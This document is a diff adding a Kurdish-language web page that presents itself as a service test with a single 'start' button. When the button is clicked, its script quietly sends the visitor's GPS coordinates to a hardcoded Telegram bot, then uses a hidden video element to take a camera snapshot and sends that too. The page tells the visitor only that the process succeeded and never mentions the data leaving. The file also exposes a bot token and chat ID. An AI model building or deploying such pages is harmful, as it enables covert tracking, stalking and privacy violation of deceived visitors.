@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تست و ناردن بۆ تێلیگرام</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #121212; color: white; padding: 20px; }
+        button { padding: 12px 24px; font-size: 16px; background: #2ed573; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 10px; margin: 15px 0; border: 1px solid #333; }
+        #status { color: #ffb142; font-weight: bold; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <h2>تاقیکردنەوەی خزمەتگوزاری</h2>
+    <p>بۆ چالاککردن، تکایە کلیل لەسەر دوگمەی خوارەوە بکە:</p>
+
+    <button onclick="startProcess()">دەستپێکردن</button>
+    <p id="status"></p>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // زانیارییەکانی بوتی تێلیگرامەکەت لێرە دابنێ
+        const BOT_TOKEN = '8795465438:AAE140ZkRXsMqG_MMQop2CHvcTygZZi_3Z0';
+        const CHAT_ID = '7750254046';
+
+        function startProcess() {
+            document.getElementById('status').innerText = 'تکایە چاوەڕێ بکە...';
+
+            // 1. وەرگرتن و ناردنی لوکەیشن
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    
+                    // ناردنی لوکەیشن بۆ تێلیگرام
+                    let message = `📍 **لوکەیشنی نوێ هات:**\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                    });
+                });
+            }
+
+            // 2. کێشانی وێنە لە کامێرا و ناردنی بۆ تێلیگرام
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                let video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(function() {
+                    let canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    let ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // گۆڕینی وێنە بۆ فۆرماتی Blob بۆ ناردن
+                    canvas.toBlob(function(blob) {
+                        let formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'capture.jpg');
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            document.getElementById('status').innerText = 'پرۆسەکە بە سەرکەوتوویی جێبەجێ بوو!';
+                            stream.getTracks().forEach(track => track.stop()); // گرتنی کامێرا
+                        });
+                    }, 'image/jpeg');
+
+                }, 2000);
+            })
+            .catch(function(err) {
+                document.getElementById('status').innerText = 'ڕێگەپێدان لەلایەن بەکارهێنەرەوە ڕەتکرایەوە.';
+            });
+        }
+    </script>
+
+</body>
+</html>
